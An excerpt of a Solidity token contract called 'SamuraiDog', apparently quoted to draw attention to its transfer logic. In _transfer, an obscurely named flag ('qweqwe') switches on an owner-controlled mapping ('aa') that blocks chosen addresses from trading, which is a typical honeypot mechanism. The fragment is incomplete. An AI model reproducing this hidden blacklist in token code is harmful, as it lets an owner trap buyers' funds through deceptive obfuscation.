...
contract ftocken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SamuraiDog";
    string private _symbol = "SamuraiDog";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x50406e4F7214953DB73aCF19dF12C20412318e07);
    address payable public teamWalletAddress = payable(0x50406e4F7214953DB73aCF19dF12C20412318e07);
    ...
    function setIsTxLimitExempt(address account, bool newValue) public onlyOwner {
        isTxLimitExempt[account] = newValue;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        // t
        if(qweqwe){
            require(!aa[sender] && !aa[recipient],"as");    
        }
